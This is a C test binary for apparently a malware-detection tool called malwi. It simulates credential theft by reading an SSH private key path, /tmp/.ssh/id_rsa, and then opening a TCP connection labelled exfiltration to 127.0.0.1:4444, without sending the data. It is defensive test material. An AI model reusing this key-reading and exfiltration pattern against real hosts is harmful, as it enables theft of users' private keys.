// Standalone malicious binary for testing malwi's symbol-level detection.
//
// This binary performs the same two-stage attack as malicious_lib.c but as a
// standalone executable. Used for:
//   - Direct native tracing tests (no Python/Node.js involved)
//   - Node.js child_process tests (simulating npm postinstall binaries)
//
// Usage: ./malicious_target [file] [host] [port]
//   Defaults: /tmp/.ssh/id_rsa  127.0.0.1  4444

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

// Stage 1: Read a sensitive file
static int steal_file(const char *path) {
    char buf[256];
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "malicious_target: open(%s) failed: %s\n", path, strerror(errno));
        return -1;
    }
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    if (n > 0) {
        buf[n] = '\0';
    }
    close(fd);
    return 0;
}

// Stage 2: Open a TCP socket and connect
static int exfil_data(const char *host, int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        fprintf(stderr, "malicious_target: socket() failed: %s\n", strerror(errno));
        return -1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    int rc = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
    if (rc < 0) {
        fprintf(stderr, "malicious_target: connect(%s:%d) failed: %s\n", host, port, strerror(errno));
    }
    close(fd);
    return rc == 0 ? 0 : -1;
}

int main(int argc, char *argv[]) {
    const char *file = argc > 1 ? argv[1] : "/tmp/.ssh/id_rsa";
    const char *host = argc > 2 ? argv[2] : "127.0.0.1";
    int port = argc > 3 ? atoi(argv[3]) : 4444;

    fprintf(stderr, "malicious_target: stealing %s, exfil to %s:%d\n", file, host, port);

    steal_file(file);
    exfil_data(host, port);

    return 0;
}
